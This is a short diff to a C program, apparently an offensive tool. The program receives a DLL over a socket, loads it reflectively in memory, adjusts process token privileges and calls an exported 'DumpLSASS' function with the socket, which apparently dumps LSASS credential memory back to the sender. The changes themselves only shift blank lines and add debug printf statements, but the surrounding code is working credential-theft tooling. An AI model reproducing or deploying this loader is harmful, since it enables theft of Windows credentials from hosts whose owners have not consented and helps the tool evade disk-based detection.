@@ -267,10 +267,10 @@ HMODULE WINAPI LoadDLL(LPVOID mem)
 	dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(mem);
 	if (!dwReflectiveLoaderOffset)
 		exit(0);
-
 	pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)mem + dwReflectiveLoaderOffset);
 	// call the librarys ReflectiveLoader...
 	pDllMain = (DLLMAIN)pReflectiveLoader();
+
 	if (pDllMain != NULL)
 	{
 		pDllMain(NULL, DLL_QUERY_HMODULE, &hResult);
@@ -305,13 +305,14 @@ int main(int argc, char **argv)
 	Recv(sock, mem, size);
 
 	Sleep(2000);
-
 	AdjustToken(proc);
-
 	
 	HMODULE Rlibary = LoadDLL(mem);
+	printf("After LoadDLL\n");
+
 	//HMODULE libary = LoadLibraryA("C:\\Users\\Alik\\Desktop\\AutoProcDump\\reflective_dll.x64.dll");
 	DumpLSASS dump = (DumpLSASS)GetProcAddressR(Rlibary, "DumpLSASS");
+	printf("dump= 0x%08x\n", dump);
 	//DumpLSASS dump = (DumpLSASS)GetProcAddressR(libary, "DumpLSASS");
 	dump(sock, procName);
 }
